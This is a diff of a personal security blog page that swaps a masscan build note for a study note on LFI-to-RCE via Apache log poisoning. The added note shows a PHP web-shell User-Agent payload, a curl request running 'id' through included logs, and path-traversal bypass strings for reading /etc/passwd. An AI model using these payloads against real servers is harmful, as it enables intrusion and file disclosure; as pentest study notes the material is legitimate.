@@ -9,9 +9,9 @@
   <meta name="description" content="一点牢骚">
   
   
-  <link rel="prev" href="https://olist213.github.io/posts/weixin-0day/" />
-  <link rel="next" href="https://olist213.github.io/posts/e-cology-workflowservicexml-rce/" />
-  <link rel="canonical" href="https://olist213.github.io/posts/vs2019-build-masscan/" />
+  <link rel="prev" href="https://olist213.github.io/study_book/time-2021-05-15/" />
+  
+  <link rel="canonical" href="https://olist213.github.io/study_book/time-2021-05-16/" />
   <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
@@ -22,10 +22,10 @@
   <title>
        
        
-           vs2019编译masscan | Olist.213
+           Time 2021 05 16 | Olist.213
        
   </title>
-  <meta name="title" content="vs2019编译masscan | Olist.213">
+  <meta name="title" content="Time 2021 05 16 | Olist.213">
     
   
   <link rel="stylesheet" href="/font/iconfont.css">
@@ -43,10 +43,10 @@
          "@type": "WebPage",
          "@id": "https:\/\/olist213.github.io"
     },
-    "articleSection" : "posts",
-    "name" : "vs2019编译masscan",
-    "headline" : "vs2019编译masscan",
-    "description" : "vs2019编译masscan 修改两处地方\n1、misc\/string_s.h的58行改成如下代码\n_MSC_VER \u0026gt;= 1900 2、stubs\/stub-lua.c改成如下代码：\nname = (void*(*)())GetProcAddress(lib, #name); \\ if (name == NULL) fprintf(stderr, \u0026#34;liblua: %s: failed\\n\u0026#34;, #name); ",
+    "articleSection" : "study_book",
+    "name" : "Time 2021 05 16",
+    "headline" : "Time 2021 05 16",
+    "description" : "RCE via Apache logs  Poison the User-Agent in access logs: $ curl \u0026lt;http:\/\/example.org\/\u0026gt; -A \u0026#34;\u0026lt;?php system(\\\\$_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt;\u0026#34; Note: The logs will escape double quotes so use single quotes for strings in the PHP payload. Then request the logs via the LFI and execute your command. $ curl \u0026lt;http:\/\/example.org\/test.php?page=\/var\/log\/apache2\/access.log\u0026amp;cmd=id\u0026gt;   windows_baseline\n windows基线脚本（powershell）    emergency-response-checklist\n 应急响应指南    GET \/page.php?path=..\/..\/etc\/passwd Forbidden 403 ? Try One Of These: (1).",
     "inLanguage" : "zh-cn",
     "author" : "",
     "creator" : "",
@@ -54,10 +54,10 @@
     "accountablePerson" : "",
     "copyrightHolder" : "",
     "copyrightYear" : "2021",
-    "datePublished": "2021-04-19 15:28:47 \u002b0800 CST",
-    "dateModified" : "2021-04-19 15:28:47 \u002b0800 CST",
-    "url" : "https:\/\/olist213.github.io\/posts\/vs2019-build-masscan\/",
-    "wordCount" : "21",
+    "datePublished": "2021-05-16 18:49:11 \u002b0800 CST",
+    "dateModified" : "2021-05-16 18:49:11 \u002b0800 CST",
+    "url" : "https:\/\/olist213.github.io\/study_book\/time-2021-05-16\/",
+    "wordCount" : "63",
     "keywords" : [  "Olist.213"]
 }
 </script>
@@ -124,11 +124,11 @@
       		
 <article class="post-warp" itemscope itemtype="http://schema.org/Article">
     <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">vs2019编译masscan</h1>
+        <h1 class="post-title" itemprop="name headline">Time 2021 05 16</h1>
         <div class="post-meta">
                 Written by <a itemprop="name" href="https://olist213.github.io" rel="author"></a> with ♥ 
                 <span class="post-time">
-                on <time datetime=2021-04-19 itemprop="datePublished">April 19, 2021</time>
+                on <time datetime=2021-05-16 itemprop="datePublished">May 16, 2021</time>
                 </span>
                 in
                 
@@ -137,8 +137,6 @@
     <div class="post-content">
         
 
-        
-            
         
 
         
@@ -152,15 +150,38 @@
           
           
 
-          <h1 id="vs2019编译masscan">vs2019编译masscan</h1>
-<p>修改两处地方</p>
-<p>1、misc/string_s.h的58行改成如下代码</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">_MSC_VER <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1900</span>
-</code></pre></div><p><img src="/images/vs2019-build-masscan.assets/image-20210419153211091.png" alt="image-20210419153211091"></p>
-<p>2、stubs/stub-lua.c改成如下代码：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">    name = (<span style="color:#66d9ef">void</span>*(*)())GetProcAddress(lib, <span style="color:#960050;background-color:#1e0010">#</span>name); \
-    <span style="color:#66d9ef">if</span> (name == NULL) fprintf(stderr, <span style="color:#e6db74">&#34;liblua: %s: failed\n&#34;</span>, <span style="color:#960050;background-color:#1e0010">#</span>name);
-</code></pre></div><p><img src="/images/vs2019-build-masscan.assets/image-20210419153155490.png" alt="image-20210419153155490"></p>
+          <ul>
+<li>RCE via Apache logs</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Poison the User-Agent <span style="color:#66d9ef">in</span> access logs<span style="color:#960050;background-color:#1e0010">:</span>
+
+$ curl &lt;http<span style="color:#960050;background-color:#1e0010">:</span>//example.org/&gt; -A <span style="color:#e6db74">&#34;&lt;?php system(\\$_GET[&#39;cmd&#39;]);?&gt;&#34;</span>
+
+Note<span style="color:#960050;background-color:#1e0010">:</span> The logs will escape double quotes so use single quotes <span style="color:#66d9ef">for</span> strings <span style="color:#66d9ef">in</span> the PHP payload.
+Then request the logs via the LFI and execute your command.
+
+$ curl &lt;http<span style="color:#960050;background-color:#1e0010">:</span>//example.org/test.php<span style="color:#66d9ef">?</span>page=/var/log/apache2/access.log&amp;cmd=id&gt;
+</code></pre></div><ul>
+<li>
+<p><a href="https://github.com/Echox1/windows_baseline">windows_baseline</a></p>
+<ul>
+<li>windows基线脚本（powershell）</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/theLSA/emergency-response-checklist">emergency-response-checklist</a></p>
+<ul>
+<li>应急响应指南</li>
+</ul>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> GET /page.php?path<span style="color:#f92672">=</span>../../etc/passwd   Forbidden <span style="color:#ae81ff">403</span> ?  
+ Try One Of These:  
+ <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>../../../etc/passwd%00  
+ <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>....//....//....//etc/passwd  
+ <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>%252e%252e%252fetc%252fpasswd
+</code></pre></div></li>
+</ul>
 
     </div>
 
@@ -175,7 +196,7 @@
              
             <p class="copyright-item">
                     <span>Link:</span>
-                    <a href=https://olist213.github.io/posts/vs2019-build-masscan/>https://olist213.github.io/posts/vs2019-build-masscan/</span>
+                    <a href=https://olist213.github.io/study_book/time-2021-05-16/>https://olist213.github.io/study_book/time-2021-05-16/</span>
             </p>
             
             
@@ -192,10 +213,8 @@
 
     <div class="post-nav">
         
-        <a href="https://olist213.github.io/posts/weixin-0day/" class="prev" rel="prev" title="Weixin 0day复现"><i class="iconfont icon-left"></i>&nbsp;Weixin 0day复现</a>
+        <a href="https://olist213.github.io/study_book/time-2021-05-15/" class="prev" rel="prev" title="Time 2021 05 15 httpx naabu subfinder"><i class="iconfont icon-left"></i>&nbsp;Time 2021 05 15 httpx naabu subfinder</a>
          
-        
-        <a href="https://olist213.github.io/posts/e-cology-workflowservicexml-rce/" class="next" rel="next" title="E Cology WorkflowServiceXml RCE">E Cology WorkflowServiceXml RCE&nbsp;<i class="iconfont icon-right"></i></a>
         
     </div>
 
@@ -237,9 +256,8 @@
 
 
     
-     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
-      
-     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
     
   
 
